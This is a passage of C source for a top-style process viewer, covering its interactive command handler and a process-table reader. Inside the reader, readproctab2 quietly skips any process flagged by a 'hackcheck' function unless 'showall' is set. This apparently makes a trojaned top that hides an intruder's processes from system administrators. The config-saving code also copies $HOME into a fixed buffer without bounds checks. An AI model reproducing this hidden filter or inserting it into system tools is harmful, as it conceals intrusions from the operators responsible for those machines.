     * Switch the terminal to normal mode.  (Will the original
     * attributes always be normal?  Does it matter?  I suppose the
     * shell will be set up the way the user wants it.)
     */
    ioctl(0, TCSETA, &Savetty);

    /*
     * Handle the rest of the commands.
     */
    switch (c) {
      case '?':
      case 'h':
	PUTP(cl); PUTP(ho); putchar('\n'); PUTP(mr);
	printf("Proc-Top Revision 1.01");
	PUTP(me); putchar('\n');
	printf("Secure mode ");
	PUTP(md);
	fputs(Secure ? "on" : "off", stdout);
	PUTP(me);
	fputs("; cumulative mode ", stdout);
	PUTP(md);
	fputs(Cumulative ? "on" : "off", stdout);
	PUTP(me);
	fputs("; noidle mode ", stdout);
	PUTP(md);
	fputs(Noidle ? "on" : "off", stdout);
	PUTP(me);
	fputs("\n\n", stdout);
	printf("%s\n\nPress any key to continue\n", Secure ? SECURE_HELP_SCREEN : HELP_SCREEN);
	ioctl(0, TCSETA, &Rawtty);
	(void) getchar();
	break;
      case 'i':
	Noidle = !Noidle;
	SHOWMESSAGE(("No-idle mode %s", Noidle ? "on" : "off"));
	break;
      case 'k':
	if (Secure)
	    SHOWMESSAGE(("\aCan't kill in secure mode"));
	else {
	    int pid, signal;
	    PUTP(md);
	    SHOWMESSAGE(("PID to kill: "));
	    pid = getint();
	    if (pid == -1)
		break;
	    PUTP(top_clrtoeol);
	    SHOWMESSAGE(("Kill PID %d with signal [15]: ", pid));
	    PUTP(me);
	    signal = getsig();
	    if (signal == -1)
		signal = SIGTERM;
	    if (kill(pid, signal))
		SHOWMESSAGE(("\aKill of PID %d with %d failed: %s",
			     pid, signal, strerror(errno)));
	}
	break;
      case 'l':
	SHOWMESSAGE(("Display load average %s", !show_loadav ? "on" : "off"));
	if (show_loadav) {
	    show_loadav = 0;
	    header_lines--;
	} else {
	    show_loadav = 1;
	    header_lines++;
	}
	Numfields = make_header();
	break;
      case 'm':
	SHOWMESSAGE(("Display memory information %s", !show_memory ? "on" : "off"));
	if (show_memory) {
	    show_memory = 0;
	    header_lines -= 2;
	} else {
	    show_memory = 1;
	    header_lines += 2;
	}
	Numfields = make_header();
	break;
      case 'M':
        SHOWMESSAGE(("Sort by memory usage"));
	sort_type = S_MEM;
	reset_sort_options();
	register_sort_function(-1, (cmp_t)mem_sort);
	break;
      case 'n':
      case '#':
	printf("Processes to display (0 for unlimited): ");
	numinput = getint();
	if (numinput != -1) {
	    Display_procs = numinput;
	    window_size();
	}
	break;
      case 'r':
	if (Secure)
	    SHOWMESSAGE(("\aCan't renice in secure mode"));
	else {
	    int pid, val;

	    printf("PID to renice: ");
	    pid = getint();
	    if (pid == -1)
		break;
	    PUTP(tgoto(cm, 0, header_lines - 2));
	    PUTP(top_clrtoeol);
	    printf("Renice PID %d to value: ", pid);
	    val = getint();
	    if (val == -1)
		val = 10;
	    if (setpriority(PRIO_PROCESS, pid, val))
		SHOWMESSAGE(("\aRenice of PID %d to %d failed: %s",
			     pid, val, strerror(errno)));
	}
	break;
      case 'P':
        SHOWMESSAGE(("Sort by CPU usage"));
	sort_type = S_PCPU;
	reset_sort_options();
	register_sort_function(-1, (cmp_t)pcpu_sort);
	break;
      case 'c':
        show_cmd = !show_cmd;
	SHOWMESSAGE(("Show %s", show_cmd ? "command names" : "command line"));
	break;
      case 'S':
	Cumulative = !Cumulative;
	SHOWMESSAGE(("Cumulative mode %s", Cumulative ? "on" : "off"));
	if (Cumulative)
	    headers[22][1] = 'C';
	else
	    headers[22][1] = ' ';
	Numfields = make_header();
	break;
      case 's':
	if (Secure)
	    SHOWMESSAGE(("\aCan't change delay in secure mode"));
	else {
	    double tmp;
	    printf("Delay between updates: ");
	    tmp = getfloat();
	    if (!(tmp < 0))
		Sleeptime = tmp;
	}
	break;
      case 't':
	SHOWMESSAGE(("Display summary information %s", !show_stats ? "on" : "off"));
	if (show_stats) {
	    show_stats = 0;
	    header_lines -= 2;
	} else {
	    show_stats = 1;
	    header_lines += 2;
	}
	Numfields = make_header();
	break;
      case 'T':
	SHOWMESSAGE(("Sort by %s time", Cumulative ? "cumulative" : ""));
	sort_type = S_TIME;
	reset_sort_options();
	register_sort_function( -1, (cmp_t)time_sort);	
	break;
      case 'f':
      case 'F':
	change_fields();
	break;
      case 'o':
      case 'O':
	change_order();
	break;
      case 'W':
	if (getenv("HOME")) {
	    strcpy(rcfile, getenv("HOME"));
	    strcat(rcfile, "/");
	    strcat(rcfile, RCFILE);
	    fp = fopen(rcfile, "w");
	    if (fp != NULL) {
		fprintf(fp, "%s\n", Fields);
		i = (int) Sleeptime;
		if (i < 2)
		    i = 2;
		if (i > 9)
		    i = 9;
		fprintf(fp, "%d", i);
		if (Secure)
		    fprintf(fp, "%c", 's');
		if (Cumulative)
		    fprintf(fp, "%c", 'S');
		if (show_cmd)
		    fprintf(fp, "%c", 'c');
		if (Noidle)
		    fprintf(fp, "%c", 'i');
		if (!show_memory)
		    fprintf(fp, "%c", 'm');
		if (!show_loadav)
		    fprintf(fp, "%c", 'l');
		if (!show_stats)
		    fprintf(fp, "%c", 't');
		fprintf(fp, "\n");
		fclose(fp);
		SHOWMESSAGE(("Wrote configuration to %s", rcfile));
	    } else {
		SHOWMESSAGE(("Couldn't open %s", rcfile));
	    }
	} else {
	    SHOWMESSAGE(("Couldn't get $HOME -- not saving"));
	}
	break;
      default:
	SHOWMESSAGE(("\aUnknown command `%c' -- hit `h' for help", c));
    }

    /*
     * Return to raw mode.
     */
    ioctl(0, TCSETA, &Rawtty);
    return;
}


/*#####################################################################
 *#######   A readproctable function that uses already allocated  #####
 *#######   table entries.                                        #####
 *#####################################################################
 */
#define Do(x) (flags & PROC_ ## x)

proc_t** readproctab2(int flags, proc_t** tab, ...) {
    PROCTAB* PT = NULL;
    static proc_t *buff;
    int n = 0;
    static int len = 0;
    va_list ap;

    va_start(ap, tab);		/* pass through args to openproc */
    if (Do(UID))
	PT = openproc(flags, va_arg(ap, uid_t*), va_arg(ap, int));
    else if (Do(PID) || Do(TTY) || Do(STAT))
	PT = openproc(flags, va_arg(ap, void*)); /* assume ptr sizes same */
    else
	PT = openproc(flags);
    va_end(ap);
    buff = (proc_t *) 1;
    while (n<len && buff) {     /* read table: (i) already allocated chunks */
	if (tab[n]->cmdline) {
	    free((void*)*tab[n]->cmdline);
	    tab[n]->cmdline = NULL;
	}
	buff = readproc(PT, tab[n]);
	if (!showall) 
		while ((buff)&&(hackcheck(buff))) 
			buff = readproc(PT, tab[n]);
	n++;
    }
    if (buff) {
	do {               /* (ii) not yet allocated chunks */
	    tab = realloc(tab, (n+1)*sizeof(proc_t*));/* realloc as we go, using */
	    buff = readproc(PT, NULL);		  /* final null to terminate */
	    if(buff) tab[n]=buff;
	    len++;
	    n++;
	} while (buff);			  /* stop when NULL reached */
	tab[n-1] = xcalloc(NULL, sizeof (proc_t));
	tab[n-1]->pid=-1;		 /* Mark end of Table */
    } else {
	if (n == len) {
	    tab = realloc(tab, (n+1)*sizeof(proc_t*));
	    tab[n] = xcalloc(NULL, sizeof (proc_t));
	    len++;
	}
	tab[n]->pid=-1;    /* Use this instead of NULL when not at the end of */
    }                   /* the allocated space */
    closeproc(PT);
    return tab;
}
